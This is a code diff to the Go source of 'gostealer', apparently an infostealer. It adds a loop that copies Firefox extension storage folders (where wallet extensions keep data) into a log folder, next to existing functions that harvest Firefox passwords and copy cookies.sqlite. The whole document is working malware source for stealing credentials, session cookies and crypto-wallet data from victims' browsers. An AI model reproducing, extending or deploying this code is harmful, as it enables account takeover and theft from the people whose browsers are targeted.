@@ -3,9 +3,11 @@ package browsers
 import (
 	"database/sql"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"os"
 	"path"
+	"strings"
 
 	"github.com/4kord/gostealer/utils"
 )
@@ -23,9 +25,16 @@ func Firefox(browserPath, logFolderPath string) {
 		if err != nil {
 			log.Println(err)
 		}
-	}
 
-	//no wallets
+		if _, err := os.Stat(path.Join(browserPath, profile.Name(), "storage", "default")); !os.IsNotExist(err) {
+			items, _ := ioutil.ReadDir(path.Join(browserPath, profile.Name(), "storage", "default"))
+			for _, item := range items {
+				if strings.Contains(item.Name(), "moz-extension") {
+					utils.CopyFolderFiles(path.Join(browserPath, profile.Name(), "storage", "default", item.Name()), path.Join(logFolderPath, "Browsers", "Firefox", item.Name()))
+				}
+			}
+		}
+	}
 }
 
 func getFirefoxPasswords(browserPath, logFolderPath string) {
@@ -44,16 +53,6 @@ func getFirefoxPasswords(browserPath, logFolderPath string) {
 }
 
 func getFirefoxCookies(browserPath, logFolderPath string) string {
-	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
-	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
-	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
-	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
-	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
-	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
-	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
-	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
-	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
-	fmt.Println(path.Join(browserPath, "cookies.sqlite"))
 	_, err := utils.CopyFile(path.Join(browserPath, "cookies.sqlite"), path.Join(logFolderPath, "raw", "firefox_cookies.sqlite"))
 	if err != nil {
 		log.Println(err)
